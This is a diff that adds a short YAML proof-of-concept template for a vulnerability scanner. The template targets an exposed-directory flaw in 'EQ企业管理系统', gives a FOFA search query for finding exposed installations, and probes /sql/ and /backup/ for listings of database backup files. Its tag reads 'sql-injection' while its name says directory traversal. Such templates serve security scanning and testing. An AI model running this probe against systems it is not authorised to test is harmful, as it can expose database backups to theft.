@@ -1,0 +1,33 @@
+id: poc-yaml-eq-enterprise-management-system-directory-traversal
+info:
+  name: EQ企业管理系统 目录遍历漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: eq
+  fofa: body="EQ企业管理系统"
+variables:
+  path: 'sql
+
+    backup
+
+    '
+requests:
+- method: GET
+  path: /{{.path}}/
+  expression: '(status_code == 200 && contains(body,"[转到父目录]"))
+
+    &&
+
+    (
+
+    (contains(body,".sql") && contains(title,`/sql/`))
+
+    ||
+
+    (!contains(body,".sql") && contains(title,`/backup/`))
+
+    )
+
+    '
+transport: http
